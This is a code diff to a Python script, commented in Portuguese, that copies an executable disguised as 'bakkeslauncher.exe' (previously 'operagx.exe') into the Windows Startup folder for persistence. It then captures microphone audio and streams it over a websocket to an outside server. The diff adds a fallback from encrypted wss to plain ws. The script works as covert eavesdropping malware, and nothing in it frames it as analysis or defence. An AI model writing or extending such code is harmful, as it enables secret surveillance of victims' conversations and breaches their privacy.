@@ -6,19 +6,18 @@ import struct
 import os
 import shutil
 
-source = os.path.join(os.getcwd(), "operagx.exe")
+source = os.path.join(os.getcwd(), "bakkeslauncher.exe")
 USERNAME = os.environ.get("USERNAME")
 
 startup_folder = os.path.join("C:\\Users", USERNAME, "AppData", "Roaming",
                               "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
-dest = os.path.join(startup_folder, "operagx.exe")
-
-print(startup_folder)
+dest = os.path.join(startup_folder, "bakkeslauncher.exe")
 
 if not os.path.exists(dest):
     try:
         shutil.copy(source, dest)
+        print("Copiado para Startup com sucesso.")
     except Exception as e:
         print("Erro ao copiar para Startup:", e)
 else:
@@ -30,9 +29,22 @@ CHANNELS = 1
 CHUNK = 1024
 DTYPE = np.int16
 
-ws_url = f"wss://{SERVER_URL}"
-ws = websocket.WebSocket()
-ws.connect(ws_url)
+def connect_ws(server_url):
+    ws = websocket.WebSocket()
+    try:
+        ws_url = f"wss://{server_url}"
+        print(f"Tentando conectar em {ws_url} ...")
+        ws.connect(ws_url)
+        print("Conectado com wss://")
+        return ws
+    except Exception as e:
+        print("Falha no wss://, tentando ws:// ...", e)
+        ws_url = f"ws://{server_url}"
+        ws.connect(ws_url)
+        print("Conectado com ws://")
+        return ws
+
+ws = connect_ws(SERVER_URL)
 
 def send_frame(data_bytes: bytes):
     header = struct.pack("!I", len(data_bytes))
@@ -55,6 +67,5 @@ with sd.InputStream(samplerate=SAMPLE_RATE,
     except KeyboardInterrupt:
         pass
 
-# Sinaliza fim da transmissão
 send_frame(b"__END__")
 ws.close()
